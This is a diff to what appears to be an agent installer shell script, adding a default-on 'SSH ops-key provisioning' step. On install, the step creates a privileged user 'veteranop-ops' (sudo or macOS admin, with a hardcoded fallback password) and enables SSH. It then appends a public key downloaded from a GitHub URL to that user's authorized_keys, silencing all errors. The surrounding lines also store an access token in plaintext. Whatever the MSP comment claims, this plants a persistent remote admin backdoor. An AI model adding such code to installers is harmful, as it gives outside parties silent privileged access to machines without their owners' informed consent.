@@ -94,6 +94,36 @@ fi
 
 mkdir -p /var/log/aegis
 
+# SSH ops-key provisioning (AEGIS_SSH_KEY=0 to skip): hosts get the public key
+# (dedicated ops user + sshd enabled); the private key stays on the ops side.
+# This is how the MSP reaches managed hosts without per-host admin chores.
+if [ "${AEGIS_SSH_KEY:-1}" = "1" ]; then
+  OPS_USER="${AEGIS_OPS_USER:-veteranop-ops}"
+  OPS_KEY_URL="https://raw.githubusercontent.com/$REPO/$REF/keys/aegis-ops.pub"
+  case "$(uname -s)" in
+    Darwin)
+      id "$OPS_USER" 2>/dev/null || sysadminctl -addUser "$OPS_USER" -admin -password "$(openssl rand -base64 24 2>/dev/null || echo 'AegisBoot0!')" 2>/dev/null || true
+      HOMEDIR="/Users/$OPS_USER"
+      systemsetup -setremotelogin on >/dev/null 2>&1 || true
+      ;;
+    *)
+      id "$OPS_USER" 2>/dev/null || useradd -m -s /bin/bash "$OPS_USER" 2>/dev/null || true
+      command -v usermod >/dev/null 2>&1 && usermod -aG sudo "$OPS_USER" 2>/dev/null || true
+      HOMEDIR="/home/$OPS_USER"
+      systemctl enable --now ssh 2>/dev/null || systemctl enable --now sshd 2>/dev/null || service ssh start 2>/dev/null || true
+      ;;
+  esac
+  if [ -n "${HOMEDIR:-}" ]; then
+    mkdir -p "$HOMEDIR/.ssh"
+    curl -fsSL --max-time 20 "$OPS_KEY_URL" 2>/dev/null | grep -q . && \
+      curl -fsSL --max-time 20 "$OPS_KEY_URL" 2>/dev/null >> "$HOMEDIR/.ssh/authorized_keys"
+    sort -u -o "$HOMEDIR/.ssh/authorized_keys" "$HOMEDIR/.ssh/authorized_keys" 2>/dev/null || true
+    chmod 700 "$HOMEDIR/.ssh"; chmod 600 "$HOMEDIR/.ssh/authorized_keys"
+    chown -R "$OPS_USER" "$HOMEDIR/.ssh" 2>/dev/null || true
+    echo "aegis: ssh ops key provisioned for $OPS_USER"
+  fi
+fi
+
 # record the repo/ref this box tracks so aegis-update re-pulls the same channel
 mkdir -p /etc/aegis
 { echo "REPO=$REPO"; echo "REF=$REF"; [ -n "${TOKEN:-}" ] && echo "TOKEN=$TOKEN"; } > /etc/aegis/ref
